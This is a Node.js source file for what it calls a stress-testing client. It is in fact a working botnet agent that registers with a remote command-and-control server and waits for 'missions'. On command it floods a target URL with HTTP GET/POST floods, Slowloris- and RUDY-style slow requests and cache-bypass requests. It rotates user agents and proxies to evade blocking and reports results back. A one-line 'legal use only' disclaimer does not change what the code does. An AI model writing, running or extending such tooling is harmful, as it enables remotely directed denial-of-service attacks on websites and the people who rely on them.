#!/usr/bin/env node
/**
 * Stress Testing Client - Node.js Agent
 * Connects to server and executes missions on command
 * LEGAL USE ONLY: Only test systems you own or have written permission to test
 */

const axios = require('axios');
const os = require('os');
const fs = require('fs');

// Configuration
const SERVER_URL = process.env.SERVER_URL || 'https://c2-server-io.onrender.com';
const HEARTBEAT_INTERVAL = 5000; // 5 seconds

let clientId = null;
let currentMission = null;
let isAttacking = false;
let requestsSent = 0;
let requestsFailed = 0;
let userAgents = [];
let proxies = [];
let currentUAIndex = 0;
let currentProxyIndex = 0;

// Color codes
const colors = {
  reset: '\x1b[0m',
  bright: '\x1b[1m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  red: '\x1b[31m',
  cyan: '\x1b[36m',
  magenta: '\x1b[35m'
};

function log(message, color = 'reset') {
  const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
  console.log(`${colors[color]}[${timestamp}] ${message}${colors.reset}`);
}

function loadUserAgents() {
  try {
    if (fs.existsSync('useragent.txt')) {
      const data = fs.readFileSync('useragent.txt', 'utf8');
      userAgents = data.split('\n').filter(line => line.trim());
      log(`✓ Loaded ${userAgents.length} user agents`, 'green');
    } else {
      userAgents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'];
      log('⚠ useragent.txt not found, using default', 'yellow');
    }
  } catch (err) {
    userAgents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'];
    log('⚠ Error loading user agents, using default', 'yellow');
  }
}

function loadProxies() {
  try {
    if (fs.existsSync('proxy.txt')) {
      const data = fs.readFileSync('proxy.txt', 'utf8');
      proxies = data.split('\n').filter(line => line.trim());
      log(`✓ Loaded ${proxies.length} proxies`, 'green');
    } else {
      log('⚠ proxy.txt not found, no proxies loaded', 'yellow');
    }
  } catch (err) {
    log('⚠ Error loading proxies', 'yellow');
  }
}

function getRandomUA() {
  if (userAgents.length === 0) return 'Mozilla/5.0';
  currentUAIndex = (currentUAIndex + 1) % userAgents.length;
  return userAgents[currentUAIndex];
}

function getRandomProxy() {
  if (proxies.length === 0) return null;
  currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
  return proxies[currentProxyIndex];
}

async function registerWithServer() {
  try {
    const response = await axios.post(`${SERVER_URL}/api/client/register`, {
      hostname: os.hostname(),
      platform: `${os.platform()} ${os.arch()}`
    });
    
    clientId = response.data.client_id;
    log(`✓ Registered with server as: ${clientId}`, 'green');
    return true;
  } catch (error) {
    log(`✗ Failed to register: ${error.message}`, 'red');
    return false;
  }
}

async function sendHeartbeat() {
  if (!clientId) return;
  
  try {
    const response = await axios.post(`${SERVER_URL}/api/client/heartbeat/${clientId}`, {
      requests_sent: requestsSent,
      requests_failed: requestsFailed
    });
    
    // Check if server sent us a mission
    if (response.data.mission && !isAttacking) {
      currentMission = response.data.mission;
      requestsSent = 0;
      requestsFailed = 0;
      
      log(`📬 Received new mission: ${currentMission.mission_id}`, 'yellow');
      log(`   Target: ${currentMission.target_url}`, 'cyan');
      log(`   Method: ${currentMission.method}`, 'cyan');
      log(`   Duration: ${currentMission.duration}s`, 'cyan');
      
      // Execute mission
      executeMission(currentMission);
    }
    
    // Check if mission should be stopped
    if (response.data.mission && response.data.mission.stopped && isAttacking) {
      log('⛔ Stop signal received from server!', 'red');
      if (currentMission) {
        currentMission.stopped = true;
      }
    }
  } catch (error) {
    log(`✗ Heartbeat failed: ${error.message}`, 'red');
  }
}

async function makeRequest(url, method, payload, headers) {
  const startTime = Date.now();
  
  try {
    const proxy = getRandomProxy();
    const config = {
      headers: {
        'User-Agent': getRandomUA(),
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        ...headers
      },
      timeout: 3000,
      maxRedirects: 5,
      validateStatus: () => true
    };
    
    // Add proxy if available
    if (proxy) {
      const proxyParts = proxy.split(':');
      config.proxy = {
        host: proxyParts[0],
        port: parseInt(proxyParts[1]) || 8080
      };
      if (proxyParts[2] && proxyParts[3]) {
        config.proxy.auth = {
          username: proxyParts[2],
          password: proxyParts[3]
        };
      }
    }
    
    let response;
    
    // Handle different attack methods
    switch (method.toUpperCase()) {
      case 'HTTP-GET':
        // Add cache bypass
        const cacheBuster = `?cb=${Date.now()}&r=${Math.random()}`;
        response = await axios.get(url + cacheBuster, config);
        break;
        
      case 'HTTP-POST':
        response = await axios.post(url, payload || { data: 'x'.repeat(1024) }, config);
        break;
        
      case 'HTTP-SLOWLORIS':
        // Slow header sending (simulate)
        config.timeout = 30000;
        response = await axios.get(url, config);
        break;
        
      case 'HTTP-RUDY':
        // Slow POST body
        config.timeout = 30000;
        const slowPayload = 'X'.repeat(10);
        response = await axios.post(url, slowPayload, config);
        break;
        
      case 'HTTP-BYPASS':
        // Multiple cache bypass techniques
        const bypass = `?${Math.random()}=${Date.now()}&nocache=${Math.random()}`;
        config.headers['Pragma'] = 'no-cache';
        config.headers['Expires'] = '0';
        response = await axios.get(url + bypass, config);
        break;
        
      default:
        response = await axios.get(url, config);
    }
    
    const elapsed = Date.now() - startTime;
    
    return {
      success: true,
      statusCode: response.status,
      responseTime: elapsed
    };
  } catch (error) {
    const elapsed = Date.now() - startTime;
    
    return {
      success: error.code === 'ECONNABORTED' || error.code === 'ETIMEDOUT' || error.code === 'ECONNREFUSED',
      error: error.message,
      statusCode: error.response?.status || 0,
      responseTime: elapsed
    };
  }
}

async function executeMission(mission) {
  isAttacking = true;
  log(`🚀 Starting attack mission: ${mission.mission_id}`, 'magenta');
  
  const results = {
    completed: 0,
    failed: 0,
    response_times: [],
    status_codes: {},
    errors: []
  };
  
  const startTime = Date.now();
  const endTime = startTime + (mission.duration * 1000);
  const delayBetweenRequests = 1000 / mission.requests_per_second;
  
  let requestCount = 0;
  let activeRequests = 0;
  const maxConcurrent = Math.min(mission.requests_per_second, 100);
  let shouldStop = false;
  
  // Progress update interval
  const progressInterval = setInterval(() => {
    // Check for stop signal
    if (currentMission && currentMission.stopped) {
      shouldStop = true;
    }
    
    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    const remaining = ((endTime - Date.now()) / 1000).toFixed(1);
    process.stdout.write(`\r${colors.yellow}Attacking... ` +
      `Sent: ${requestsSent} | Success: ${results.completed} | ` +
      `Failed: ${requestsFailed} | Active: ${activeRequests} | ` +
      `Time: ${elapsed}s / ${remaining}s remaining${colors.reset}`);
  }, 500);
  
  // Fire requests with controlled concurrency
  const fireRequest = async () => {
    activeRequests++;
    const result = await makeRequest(
      mission.target_url,
      mission.method,
      mission.payload,
      mission.headers
    );
    activeRequests--;
    
    requestCount++;
    
    if (result.success) {
      results.completed++;
      results.response_times.push(result.responseTime);
      requestsSent++;
      
      const statusKey = String(result.statusCode);
      results.status_codes[statusKey] = (results.status_codes[statusKey] || 0) + 1;
    } else {
      results.failed++;
      requestsFailed++;
      if (results.errors.length < 10) {
        results.errors.push(result.error);
      }
    }
    
    return result;
  };
  
  // Main attack loop with concurrency control
  const requests = [];
  
  while (Date.now() < endTime && !shouldStop) {
    // Check stop signal
    if (currentMission && currentMission.stopped) {
      log('\n⛔ Mission stopped by server', 'red');
      shouldStop = true;
      break;
    }
    
    const batchSize = Math.min(
      maxConcurrent - activeRequests,
      mission.requests_per_second
    );
    
    for (let i = 0; i < batchSize && Date.now() < endTime && !shouldStop; i++) {
      requests.push(fireRequest());
    }
    
    await new Promise(resolve => setTimeout(resolve, Math.max(10, delayBetweenRequests / 10)));
  }
  
  // Wait for all pending requests to complete (max 10 seconds)
  const timeout = Date.now() + 10000;
  while (activeRequests > 0 && Date.now() < timeout) {
    await new Promise(resolve => setTimeout(resolve, 100));
  }
  
  clearInterval(progressInterval);
  
  console.log('\n');
  
  if (shouldStop) {
    log(`⛔ Mission STOPPED: ${results.completed} successful, ${results.failed} failed`, 'red');
  } else {
    log(`✓ Mission completed: ${results.completed} successful, ${results.failed} failed`, 'green');
  }
  
  // Calculate statistics
  if (results.response_times.length > 0) {
    results.stats = {
      min: Math.min(...results.response_times),
      max: Math.max(...results.response_times),
      avg: results.response_times.reduce((a, b) => a + b, 0) / results.response_times.length
    };
  }
  
  // Report results back to server
  await reportResults(mission.mission_id, results);
  
  isAttacking = false;
  currentMission = null;
}

async function reportResults(missionId, results) {
  try {
    await axios.post(`${SERVER_URL}/api/client/report/${clientId}`, {
      mission_id: missionId,
      results: results
    });
    
    log(`📤 Results reported to server`, 'green');
  } catch (error) {
    log(`✗ Failed to report results: ${error.message}`, 'red');
  }
}

async function main() {
  log('=' .repeat(60), 'bright');
  log('STRESS TEST CLIENT - AWAITING ORDERS FROM SERVER', 'bright');
  log('=' .repeat(60), 'bright');
  log(`Server: ${SERVER_URL}`, 'cyan');
  log(`Hostname: ${os.hostname()}`, 'cyan');
  log(`Platform: ${os.platform()} ${os.arch()}`, 'cyan');
  log('=' .repeat(60), 'bright');
  
  // Load user agents and proxies
  loadUserAgents();
  loadProxies();
  
  // Register with server
  const registered = await registerWithServer();
  if (!registered) {
    log('Failed to register. Exiting.', 'red');
    process.exit(1);
  }
  
  log('🎯 Client ready. Waiting for missions...', 'green');
  
  // Start heartbeat loop
  setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
  
  // Initial heartbeat
  sendHeartbeat();
}

// Handle graceful shutdown
process.on('SIGINT', async () => {
  log('\n👋 Shutting down client...', 'yellow');
  
  if (isAttacking) {
    log('⚠️  Warning: Shutting down during active mission!', 'red');
  }
  
  process.exit(0);
});

// Run the client
main().catch(error => {
  log(`Fatal error: ${error.message}`, 'red');
  process.exit(1);
});
